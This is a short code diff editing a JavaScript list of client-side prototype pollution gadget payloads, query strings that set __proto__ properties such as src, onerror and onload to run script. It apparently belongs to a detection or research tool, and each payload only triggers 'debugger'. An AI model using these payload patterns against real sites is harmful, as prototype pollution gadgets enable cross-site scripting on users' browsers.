@@ -24,7 +24,7 @@ var GADGETS = [
     '__proto__[innerText]=<script>debugger</script>',
     '__proto__[CLOSURE_BASE_PATH]=data:,debugger//',
     '__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=debugger',
-    '__proto__[src]=data:,debugger;debugger//',
+    '__proto__[src]=data:,debugger//',
     '__proto__[xxx]=debugger',
     '__proto__[onload]=debugger',
     '__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%3ddebugger>&__proto__[script][2]=1',
